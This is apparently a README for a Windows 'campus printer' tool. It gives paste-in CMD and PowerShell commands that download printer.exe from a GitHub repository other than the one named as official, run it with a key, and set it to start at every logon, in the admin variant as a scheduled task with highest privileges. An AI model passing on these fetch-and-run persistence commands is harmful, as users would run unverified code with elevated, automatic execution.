# Printer Setup

Print directly to campus printers on Windows via native Win32 executable (`printer.exe`).

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Command Prompt (CMD) Setup

### 1. User Setup (Standard / Non-Admin)

Paste directly into **CMD**:

```cmd
powershell -Command "$d = \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = \"$d\printer.exe\"; if (-not (Test-Path $exe)) { Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.exe\" -OutFile $exe -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(\"<WORKER_KEY>\"), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); $k = \"DPAPI:\" + [Convert]::ToBase64String($e); Set-Content \"$d\printer.bat\" \"@echo off`r`nstart /b `\"$exe`\" `\"$k`\"\" -Force; Start-Process \"$exe\" -ArgumentList \"`\"$k`\"\""
```

---

### 2. Admin Setup (Administrator)

Paste directly into **CMD (as Administrator)**:

```cmd
powershell -Command "$d = \"$env:ProgramData\printer\"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = \"$d\printer.exe\"; if (-not (Test-Path $exe)) { Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.exe\" -OutFile $exe -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(\"<WORKER_KEY>\"), $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine); $k = \"DPAPI:\" + [Convert]::ToBase64String($e); schtasks /Create /TN \"printer\" /TR \"`\"$exe`\" `\"$k`\"\" /SC ONLOGON /RL HIGHEST /F; schtasks /Run /TN \"printer\""
```

---

## PowerShell Setup

### 1. User Setup (Standard / Non-Admin)

Run in **PowerShell**:

```powershell
$d = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = "$d\printer.exe"; if (-not (Test-Path $exe)) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.exe" -OutFile $exe -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); $k = "DPAPI:" + [Convert]::ToBase64String($e); Set-Content "$d\printer.bat" "@echo off`r`nstart /b `"$exe`" `"$k`"" -Force; Start-Process "$exe" -ArgumentList "`"$k`""
```

---

### 2. Admin Setup (Administrator)

Run in **PowerShell as Administrator**:

```powershell
$d = "$env:ProgramData\printer"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = "$d\printer.exe"; if (-not (Test-Path $exe)) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.exe" -OutFile $exe -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine); $k = "DPAPI:" + [Convert]::ToBase64String($e); schtasks /Create /TN "printer" /TR "`"$exe`" `"$k`"" /SC ONLOGON /RL HIGHEST /F; schtasks /Run /TN "printer"
```

---

## Debug Mode

```cmd
powershell -Command "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.exe\" -OutFile \"printer.exe\" -UseBasicParsing; .\printer.exe <WORKER_KEY> --debug"
```

---

## Uninstall

### CMD

Paste into **CMD**:

```cmd
powershell -Command "schtasks /Delete /TN \"printer\" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter \"Name='printer.exe'\" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s=\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"; Remove-Item \"$s\printer.*\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:ProgramData\printer\" -Recurse -Force -ErrorAction SilentlyContinue"
```

---

### PowerShell

Run in **PowerShell**:

```powershell
schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='printer.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\printer.*" -Force -ErrorAction SilentlyContinue; Remove-Item "$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue
```